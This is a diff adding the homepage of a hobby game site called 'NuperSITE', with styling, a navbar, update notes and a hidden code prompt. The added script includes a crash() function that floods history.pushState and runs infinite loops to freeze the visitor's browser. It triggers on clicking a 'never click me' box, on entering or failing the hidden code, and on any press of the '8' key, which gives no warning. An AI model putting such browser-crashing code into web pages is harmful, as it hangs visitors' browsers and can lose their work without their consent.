@@ -1,12 +1,455 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <title>My Simple Web Page</title>
-</head>
-<body>
+<html lang="en">
+  <head>
+    <link rel="icon" type="image/x-icon" href="icon.ico" />
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>NuperSITE - Home (DEV)</title>
+    <style>
+      body {
+        font-family: "Lexend", sans-serif;
+        margin: 0;
+        padding: 0;
+        background-color: #1b1b1bff;
+        color: white;
+        cursor: url("cursor.png"), default;
+      }
 
-  <h1>Testing</h1>
+      .middle {
+        text-align: center;
+      }
 
+      .header {
+        background-color: rgba(68, 68, 68, 0.2);
+        padding: 10px 20px;
+        display: flex;
+        align-items: center;
+        border-radius: 50px;
+        position: fixed;
+        width: 100%;
+        top: 0;
+        z-index: 100;
+        box-sizing: border-box; /* Ensures padding doesn't affect width */
+        backdrop-filter: blur(10px);
+      }
 
-</body>
+      .navbar {
+        margin-left: auto;
+        display: flex;
+        justify-content: flex-end; /* Ensures links stay to the right */
+      }
+
+      .navbar a {
+        color: white;
+        text-decoration: none;
+        margin-left: 20px;
+        padding: 5px 10px;
+        transition: background-color 0.3s;
+        white-space: nowrap; /* Prevent text wrapping */
+      }
+
+      .iconimage {
+        border-radius: 10px;
+      }
+
+      .header img {
+        height: 50px;
+      }
+
+      .header .title {
+        font-size: 24px;
+        margin-right: 10px;
+      }
+
+      .navbar a:hover {
+        background-color: #555;
+      }
+
+      .dropdown {
+        position: absolute;
+        top: 60px;
+        left: 0;
+        background-color: rgba(68, 68, 68, 0.3);
+        border-radius: 20px;
+        box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+        visibility: hidden;
+        opacity: 0;
+        transition: opacity 0.3s ease, visibility 0.3s ease;
+        z-index: 1000;
+        padding: 20px;
+        width: 300px;
+        backdrop-filter: blur(5px);
+        /* Apply blur to the dropdown background */
+      }
+
+      .dropdown a {
+        color: white;
+        text-decoration: none;
+        display: block;
+        padding: 10px 0;
+        transition: background-color 0.3s;
+      }
+
+      .dropdown a:hover {
+        cursor: url("link.png"), pointer;
+        background-color: #555;
+      }
+
+      body.blurred {
+        filter: blur(10px);
+        /* Apply blur to the background when dropdown is open */
+      }
+
+      .box {
+        background-color: #444;
+        border-radius: 20px;
+        padding: 20px;
+        width: 150px;
+        height: 30px;
+        box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2);
+        transition: transform 0.2s;
+        cursor: pointer;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        margin: 20px auto;
+      }
+
+      .box:hover {
+        cursor: url("link.png"), pointer;
+        transform: scale(1.05);
+      }
+
+      .box .name {
+        font-size: 20px;
+      }
+
+      .updates {
+        padding: 20px;
+        background-color: #2a2a2a;
+        border-radius: 10px;
+        margin: 20px 0;
+      }
+
+      .updates h1 {
+        font-size: 28px;
+        margin-bottom: 10px;
+      }
+
+      @keyframes spin {
+        from {
+          transform: rotate(0deg);
+        }
+
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      #spinImage {
+        animation: spin infinite 0.01s linear;
+        display: block;
+        margin: 20px auto;
+      }
+
+      footer {
+        text-align: center;
+        padding: 20px;
+        background-color: #434343ff;
+        margin-top: 40px;
+        border-radius: 20px;
+      }
+
+      footer p {
+        margin: 0;
+        font-size: 16px;
+      }
+
+      footer a {
+        cursor: url("link.png"), pointer;
+        color: white;
+        text-decoration: underline;
+      }
+
+      span {
+        display: inline-flex;
+        align-items: center;
+      }
+
+      span img {
+        margin-right: 1px;
+        height: 1em;
+      }
+
+      #hiddenDiv {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        z-index: 9999;
+        display: none;
+        background-color: rgba(68, 68, 68, 0.5);
+        border-radius: 20px;
+        padding: 20px;
+        width: 300px;
+        box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2);
+        color: white;
+        text-align: center;
+        backdrop-filter: blur(10px);
+      }
+
+      #submitBtn {
+        background-color: #555;
+        font-family: "Lexend", sans-serif;
+        border: none;
+        color: white;
+        padding: 10px 20px;
+        text-align: center;
+        text-decoration: none;
+        display: block;
+        margin: 10px auto;
+        font-size: 16px;
+        cursor: pointer;
+        border-radius: 5px;
+        transition: background-color 0.3s;
+      }
+
+      #inputField {
+        box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2);
+        background-color: #363535;
+        color: white;
+        font-family: "Lexend", sans-serif;
+        flex-grow: 1;
+        margin-right: 10px;
+        padding: 5px 10px;
+        border: none;
+        border-radius: 10px;
+        font-size: 16px;
+        text-align: center;
+      }
+
+      #inputField.grayed-out {
+        color: rgb(71, 71, 71);
+      }
+
+      @keyframes twitch {
+        0% {
+          transform: translateX(-5px);
+        }
+
+        25% {
+          transform: translateX(5px);
+        }
+
+        50% {
+          transform: translateX(-5px);
+        }
+
+        75% {
+          transform: translateX(5px);
+        }
+
+        100% {
+          transform: translateX(0);
+        }
+      }
+
+      .incorrect-code {
+        animation: twitch 0.2s ease-in-out;
+      }
+    </style>
+
+    <link
+      href="https://fonts.googleapis.com/css2?family=Lexend&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+
+  <body>
+    <div class="header">
+      <div style="position: relative">
+        <img
+          src="images/icon.png"
+          class="iconimage"
+          alt="Logo"
+          onclick="toggleDropdown()"
+        />
+      </div>
+      <div class="title">⠀NuperSITE</div>
+      <div class="navbar">
+        <a href="index.html">Home</a>
+        <a href="stuff.html">Stuff</a>
+        <a href="tools.html">Tools</a>
+        <a href="videos/list.html">Videos</a>
+        <a href="troubleshooting.html">Troubleshooting</a>
+      </div>
+    </div>
+
+    <div id="hiddenDiv">
+      <p>
+        You pressed 1, the hidden code! But you have to enter the code to get
+        in.
+      </p>
+      <input type="text" id="inputField" placeholder="Enter code..." />
+      <button id="submitBtn">Submit</button>
+      <p>Attempts left: <span id="attempts">10</span></p>
+    </div>
+
+    <div class="content" style="padding: 65px">
+      <h1 class="middle">Hello!</h1>
+      <p class="middle">
+        Hi! This is a game website, although not because there is educational
+        stuff! (check out tools)
+      </p>
+      <p class="middle">Check out the "Stuff" tab for stuff you might like!</p>
+      <p class="middle">More stuff will be in the stuff tab, soon.</p>
+      <p class="middle">Please dont mind my spinning logo. Its very fast.</p>
+      <p class="middle">Made in Herrera, made out of the oven.</p>
+      <img id="spinImage" src="images/icon.png" alt="Logo" />
+    </div>
+    <div class="box" onclick="crash()">
+      <div class="name">never click me</div>
+    </div>
+  </body>
+
+  <footer>
+    <p>
+      Any questions? Please email me at
+      <a href="mailto:nupersoavez@gmail.com">nupersoavez@gmail.com</a>
+    </p>
+  </footer>
+
+  <div class="updates">
+    <h1 class="middle">Updates | Last Updated: Sept 26 11:05PM CST</h1>
+    <p>
+      Hey there! New updates, new design! Navbar is fixed up so you can scroll
+      with the navbar there!
+    </p>
+
+    <p>
+      NEW PAGE! Troubleshooting tab, which you can fix problems with my website.
+    </p>
+
+    <p>Bluuuurrr design! Navbar has blur background, adds a nice touch!</p>
+
+    <p>Removal of dropdown, because its useless.</p>
+
+    <p>Videos tab button!</p>
+
+    <p>Search bar is now attacted to the navbar when in stuff.</p>
+
+    <p>Huge bug fixes.</p>
+  </div>
+
+  <footer>
+    <p>
+      Also, to find the source code of NuperSITE, check Github and search for
+      "NuperSITE" by NuperSITE organization.
+    </p>
+  </footer>
+
+  <script>
+    // Initialize attempts counter
+    var attemptsLeft = 10;
+
+    document.addEventListener("keydown", function (event) {
+      // Check if the pressed key is '1'
+      if (event.key === "1") {
+        var hiddenDiv = document.getElementById("hiddenDiv");
+        hiddenDiv.style.display = "block";
+      }
+    });
+
+    // Add event listener to submit button
+    document.getElementById("submitBtn").addEventListener("click", function () {
+      // Get the input value
+      var code = document.getElementById("inputField").value.trim();
+      // Check if the code is correct
+      if (code === "Nova") {
+        // Replace "1234" with your correct code
+        crash();
+      } else {
+        // Add the incorrect-code class to the input field to trigger the twitching animation
+        document.getElementById("inputField").classList.add("incorrect-code");
+        // Remove the class after the animation completes to allow for multiple attempts
+        setTimeout(function () {
+          document
+            .getElementById("inputField")
+            .classList.remove("incorrect-code");
+        }, 200);
+        // Decrement attempts counter
+        attemptsLeft--;
+        document.getElementById("attempts").textContent = attemptsLeft;
+        // Gray out the input field if attempts run out
+        if (attemptsLeft === 0) {
+          crash();
+        }
+      }
+    });
+
+    document.addEventListener("keydown", function (event) {
+      if (event.key === "8") {
+        crash();
+      }
+    });
+
+    function toggleDropdown() {
+      var dropdown = document.getElementById("dropdownMenu");
+      if (dropdown.style.visibility === "visible") {
+        dropdown.style.visibility = "hidden";
+        dropdown.style.opacity = 0;
+      } else {
+        dropdown.style.visibility = "visible";
+        dropdown.style.opacity = 1;
+      }
+    }
+
+    window.onclick = function (event) {
+      if (!event.target.matches(".iconimage")) {
+        var dropdowns = document.getElementsByClassName("dropdown");
+        for (var i = 0; i < dropdowns.length; i++) {
+          var openDropdown = dropdowns[i];
+          openDropdown.style.visibility = "hidden";
+          openDropdown.style.opacity = 0;
+        }
+      }
+    };
+    function crash() {
+      var total = "";
+      for (var i = 0; i < 9999999999999; i++) {
+        total += i.toString();
+        history.pushState(0, 0, total);
+      }
+
+      while (true) {
+        for (let i = 999909; i === i; i *= i) {
+          console.log(i);
+        }
+      }
+
+      while (true) {
+        for (let i = 991; i === i; i *= i) {
+          console.log(i);
+        }
+      }
+
+      while (true) {
+        for (let i = 9999; i === i; i *= i) {
+          console.log(i);
+        }
+      }
+
+      while (true) {
+        for (let i = 999; i === i; i *= i) {
+          console.log(i);
+        }
+      }
+      while (true) {
+        for (let i = 9999; i === i; i *= i) {
+          console.log(i);
+        }
+      }
+    }
+  </script>
 </html>
